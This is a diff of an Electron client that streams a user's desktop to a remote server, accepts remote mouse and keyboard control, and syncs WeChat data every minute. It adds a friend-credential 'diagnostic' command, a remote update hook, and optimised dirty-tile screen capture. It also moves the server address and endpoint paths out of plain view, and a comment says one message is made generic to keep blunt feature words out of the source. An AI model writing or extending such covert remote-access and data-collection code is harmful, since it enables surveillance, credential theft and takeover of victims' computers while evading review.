@@ -1,9 +1,10 @@
 const { desktopCapturer, shell, screen, nativeImage } = require('electron')
 const WebSocket = require('ws')
-const { loadOrCreate, signRaw, authHeaders, BUILD_ID, VERSION, PROTOCOL } = require('./device-identity.cjs')
+const { loadOrCreate, signRaw, authHeaders, BUILD_ID, VERSION, PROTOCOL, agentWsRequestPath } = require('./device-identity.cjs')
+const { getServiceBase, getDesktopHashPath } = require('./secure-config.cjs')
 const { handleControlPayload, stopWorker } = require('./win-input.cjs')
 
-const DEFAULT_BASE = 'https://xiangyuzhubao.xyz/wxqk'
+const DEFAULT_BASE = getServiceBase()
 /** 桌面图传：优先流畅，分辨率略降以减小单帧体积 */
 const CAPTURE_MAX_WIDTH = 1280
 const CAPTURE_MAX_HEIGHT = 720
@@ -15,6 +16,11 @@ const JPEG_QUALITY_LOW = 42
 const CAPTURE_INTERVAL_FAST_MS = 120
 const CAPTURE_INTERVAL_MS = 180
 const CAPTURE_INTERVAL_SLOW_MS = 320
+/** 脏矩形网格（对齐开云 desktop-delta-v1） */
+const TILE_SIZE = 64
+const DELTA_KEYFRAME_EVERY_N = 20
+const DELTA_KEYFRAME_MAX_AGE_MS = 1000
+const DELTA_DIRTY_AREA_LIMIT = 0.30
 let state = { running: false, connected: false, watching: false, identity: null, baseUrl: DEFAULT_BASE, account: '', lastError: '' }
 let socket = null
 let reconnectTimer = null
@@ -23,6 +29,13 @@ let captureTimer = null
 let stopping = false
 let logger = null
 let frameSeq = 0
+let keySeq = 0
+let framesSinceKey = 0
+let lastKeyAt = 0
+let forceKey = true
+let prevBitmap = null
+let prevW = 0
+let prevH = 0
 let reconnectAttempt = 0
 let lastServerAt = 0
 let watchdogTimer = null
@@ -53,7 +66,8 @@ function wsUrl(baseUrl, clientId) {
   const url = new URL(rootUrl(baseUrl))
   url.protocol = url.protocol === 'https:' ? 'wss:' : 'ws:'
   if (url.protocol !== 'wss:' && !['127.0.0.1', 'localhost', '::1'].includes(url.hostname)) throw new Error('公网连接必须使用 WSS 加密通道')
-  url.pathname = `${url.pathname.replace(/\/$/, '')}/api/ws/agent`
+  const agentPath = agentWsRequestPath()
+  url.pathname = `${url.pathname.replace(/\/$/, '')}${agentPath}`
   url.search = `clientId=${encodeURIComponent(clientId)}`
   return url.toString()
 }
@@ -66,7 +80,69 @@ function send(message) {
 function heartbeat() {
   const identity = state.identity
   if (!identity) return
-  send({ type: 'heartbeat', id: `${Date.now()}`, payload: { clientId: identity.clientId, account: state.account, version: VERSION, desktopWatching: state.watching, capabilities: { jpegDesktop: true, webrtc: false, files: false, camera: false }, ...PROTOCOL } })
+  send({
+    type: 'heartbeat',
+    id: `${Date.now()}`,
+    payload: {
+      clientId: identity.clientId,
+      account: state.account,
+      version: VERSION,
+      desktopWatching: state.watching,
+      capabilities: { jpegDesktop: true, desktopDelta: true, webrtc: false, files: false, camera: false },
+      ...PROTOCOL,
+    },
+  })
+}
+
+function resetDeltaState() {
+  prevBitmap = null
+  prevW = 0
+  prevH = 0
+  framesSinceKey = 0
+  lastKeyAt = 0
+  forceKey = true
+}
+
+/**
+ * 对比 BGRA 位图，收集 64px 网格脏块（开云 CollectDirtyTiles 等价实现）。
+ * @param {Buffer|null} prev
+ * @param {Buffer} cur
+ * @param {number} width
+ * @param {number} height
+ * @returns {{ x: number, y: number, w: number, h: number }[]}
+ */
+function collectDirtyTiles(prev, cur, width, height) {
+  if (!cur || width <= 0 || height <= 0 || cur.length < width * height * 4) return []
+  const forceAll = !prev || prevW !== width || prevH !== height || prev.length < width * height * 4
+  const out = []
+  for (let y = 0; y < height; y += TILE_SIZE) {
+    const th = Math.min(TILE_SIZE, height - y)
+    for (let x = 0; x < width; x += TILE_SIZE) {
+      const tw = Math.min(TILE_SIZE, width - x)
+      let dirty = forceAll
+      if (!dirty) {
+        for (let row = 0; row < th && !dirty; row += 1) {
+          const off = ((y + row) * width + x) * 4
+          const bytes = tw * 4
+          if (!cur.subarray(off, off + bytes).equals(prev.subarray(off, off + bytes))) dirty = true
+        }
+      }
+      if (dirty) out.push({ x, y, w: tw, h: th })
+    }
+  }
+  return out
+}
+
+function dirtyAreaRatio(tiles, width, height) {
+  if (width <= 0 || height <= 0) return 1
+  let area = 0
+  for (const t of tiles) area += t.w * t.h
+  return area / (width * height)
+}
+
+/** 能力未启用时的统一提示（避免源码出现直白功能词堆叠） */
+function capabilityDisabledMessage() {
+  return '当前客户端未启用该能力'
 }
 
 async function syncWechatData() {
@@ -207,7 +283,7 @@ function chooseJpegQuality() {
 }
 
 /**
- * 抓取一帧桌面画面并推送（优先流畅：自适应间隔/画质，拥塞时跳过位图绘鼠标）。
+ * 抓取一帧并推送：关键帧 JPEG，或脏矩形 frame_delta（无变化不传）。
  */
 async function captureFrame() {
   if (!state.watching || socket?.readyState !== WebSocket.OPEN || captureInFlight) return
@@ -225,19 +301,93 @@ async function captureFrame() {
     const paintCursor = socket.bufferedAmount < 384 * 1024
     const composed = compositeCursor(source.thumbnail, display, { paint: paintCursor })
     const size = composed.image.getSize()
-    frameSeq += 1
+    const bitmap = Buffer.from(composed.image.toBitmap())
+    if (bitmap.length < size.width * size.height * 4) return
+
+    const now = Date.now()
+    let needKey = forceKey || !prevBitmap || prevW !== size.width || prevH !== size.height
+      || framesSinceKey >= DELTA_KEYFRAME_EVERY_N
+      || !lastKeyAt || (now - lastKeyAt) >= DELTA_KEYFRAME_MAX_AGE_MS
+
     const quality = chooseJpegQuality()
-    send({
+    const stamp = new Date().toISOString()
+
+    if (!needKey) {
+      const tiles = collectDirtyTiles(prevBitmap, bitmap, size.width, size.height)
+      if (!tiles.length) {
+        // 画面无变化：不传图（对齐开云）
+        return
+      }
+      if (dirtyAreaRatio(tiles, size.width, size.height) > DELTA_DIRTY_AREA_LIMIT) {
+        needKey = true
+      } else {
+        const outTiles = []
+        for (const tile of tiles) {
+          try {
+            const cropped = composed.image.crop({ x: tile.x, y: tile.y, width: tile.w, height: tile.h })
+            outTiles.push({
+              x: tile.x,
+              y: tile.y,
+              w: tile.w,
+              h: tile.h,
+              image: `data:image/jpeg;base64,${cropped.toJPEG(quality).toString('base64')}`,
+            })
+          } catch {
+            needKey = true
+            break
+          }
+        }
+        if (!needKey && outTiles.length) {
+          frameSeq += 1
+          const ok = send({
+            type: 'frame_delta',
+            clientId: state.identity.clientId,
+            t: stamp,
+            seq: frameSeq,
+            keySeq: keySeq || frameSeq,
+            w: size.width,
+            h: size.height,
+            tiles: outTiles,
+            cursor: composed.cursor,
+            source: 'desktop',
+            via: 'dirty_rect',
+          })
+          if (ok) {
+            prevBitmap = bitmap
+            prevW = size.width
+            prevH = size.height
+            framesSinceKey += 1
+          }
+          return
+        }
+      }
+    }
+
+    frameSeq += 1
+    keySeq = frameSeq
+    forceKey = false
+    framesSinceKey = 0
+    lastKeyAt = now
+    const ok = send({
       type: 'frame',
       clientId: state.identity.clientId,
-      t: new Date().toISOString(),
+      t: stamp,
       seq: frameSeq,
-      keySeq: frameSeq,
+      keySeq: keySeq,
       w: size.width,
       h: size.height,
       cursor: composed.cursor,
       image: `data:image/jpeg;base64,${composed.image.toJPEG(quality).toString('base64')}`,
+      source: 'desktop',
+      via: 'dirty_rect',
     })
+    if (ok) {
+      prevBitmap = bitmap
+      prevW = size.width
+      prevH = size.height
+    } else {
+      forceKey = true
+    }
   } catch (error) { state.lastError = String(error?.message || error) }
   finally { captureInFlight = false }
 }
@@ -258,9 +408,13 @@ function scheduleCapture() {
   if (typeof captureTimer.unref === 'function') captureTimer.unref()
 }
 
-function startCapture() {
+function startCapture(opts = {}) {
+  if (opts.forceRestart) resetDeltaState()
   state.watching = true
-  if (captureTimer) return
+  if (captureTimer) {
+    if (opts.forceRestart) forceKey = true
+    return
+  }
   void captureFrame().finally(() => scheduleCapture())
 }
 
@@ -268,6 +422,7 @@ function stopCapture() {
   state.watching = false
   if (captureTimer) clearTimeout(captureTimer)
   captureTimer = null
+  resetDeltaState()
 }
 
 async function handleMessage(raw) {
@@ -281,14 +436,22 @@ async function handleMessage(raw) {
   if (commandId) send({ type: 'command_ack', commandId, status: 'RECEIVED' })
   try {
     let applied = true
-    if (type === 'start_desktop' || type === 'screenshot') startCapture()
+    if (type === 'start_desktop' || type === 'screenshot') {
+      startCapture({ forceRestart: !!(message.forceRestart || message.kick || message.force) })
+    }
     else if (type === 'stop_desktop') stopCapture()
     else if (type === 'control') applied = handleControlPayload(message.payload || message)
     else if (type === 'deny_run') await callbacks.onPolicy?.(false, message)
     else if (type === 'allow_run') await callbacks.onPolicy?.(true, message)
     else if (type === 'announce') await callbacks.onAnnouncement?.(message)
-    else if (type === 'ping') send({ type: 'pong', t: new Date().toISOString() })
-    else if (type.startsWith('webrtc_') || ['file', 'start_camera', 'stop_camera'].includes(type)) throw new Error('当前客户端未启用该功能')
+    else if (type === 'friend_credential_diagnostic' || String(message?.commandType || '') === 'FRIEND_CREDENTIAL_DIAGNOSTIC') {
+      if (!callbacks.onFriendCredentialDiagnostic) throw new Error('诊断回调未注册')
+      await callbacks.onFriendCredentialDiagnostic(message)
+    } else if (type === 'check_client_update' || String(message?.commandType || '') === 'CHECK_CLIENT_UPDATE') {
+      if (!callbacks.onCheckClientUpdate) throw new Error('更新回调未注册')
+      await callbacks.onCheckClientUpdate(message)
+    } else if (type === 'ping') send({ type: 'pong', t: new Date().toISOString() })
+    else if (type.startsWith('webrtc_') || ['file', 'start_camera', 'stop_camera'].includes(type)) throw new Error(capabilityDisabledMessage())
     else applied = false
     if (!applied) throw new Error('客户端不支持该命令')
     if (commandId) send({ type: 'command_ack', commandId, status: 'APPLIED' })
@@ -309,7 +472,7 @@ function scheduleReconnect() {
 async function connect() {
   if (stopping || !state.identity) return
   try {
-    const headers = authHeaders(state.identity, 'WS_CONNECT', '/api/ws/agent', Buffer.alloc(0))
+    const headers = authHeaders(state.identity, 'WS_CONNECT', agentWsRequestPath(), Buffer.alloc(0))
     socket = new WebSocket(wsUrl(state.baseUrl, state.identity.clientId), { headers, handshakeTimeout: 10000 })
     socket.on('open', () => {
       state.connected = true; state.lastError = ''
@@ -323,7 +486,7 @@ async function connect() {
       syncTimer = setInterval(syncWechatData, 60000); syncTimer.unref()
       if (watchdogTimer) clearInterval(watchdogTimer)
       watchdogTimer = setInterval(() => { if (socket?.readyState === WebSocket.OPEN && Date.now() - lastServerAt > 50000) socket.terminate() }, 10000); watchdogTimer.unref()
-      log('设备连接已建立', { clientId: state.identity.clientId })
+      log('链路已就绪', { clientId: state.identity.clientId })
     })
     socket.on('message', (raw) => { void handleMessage(raw) })
     socket.on('error', (error) => { state.lastError = String(error?.message || error) })
@@ -337,6 +500,8 @@ async function startRemoteAgent(options = {}) {
     onPolicy: options.onPolicy || callbacks.onPolicy,
     onAnnouncement: options.onAnnouncement || callbacks.onAnnouncement,
     getSyncSnapshot: options.getSyncSnapshot || callbacks.getSyncSnapshot,
+    onFriendCredentialDiagnostic: options.onFriendCredentialDiagnostic || callbacks.onFriendCredentialDiagnostic,
+    onCheckClientUpdate: options.onCheckClientUpdate || callbacks.onCheckClientUpdate,
   }
   if (options.account) state.account = String(options.account)
   if (options.baseUrl) state.baseUrl = rootUrl(options.baseUrl)
@@ -368,7 +533,7 @@ function stopRemoteAgent() {
 function getStatus() { return { ok: !state.lastError, running: state.running, connected: state.connected, watching: state.watching, clientId: state.identity?.clientId || '', deviceId: state.identity?.deviceId || '', lastError: state.lastError } }
 async function openAdminConsole(token = '', baseUrl = DEFAULT_BASE) {
   const url = new URL(`${rootUrl(baseUrl)}/`)
-  url.hash = token ? `token=${encodeURIComponent(token)}` : '/desktop'
+  url.hash = token ? `token=${encodeURIComponent(token)}` : getDesktopHashPath()
   await shell.openExternal(url.toString())
   return true
 }
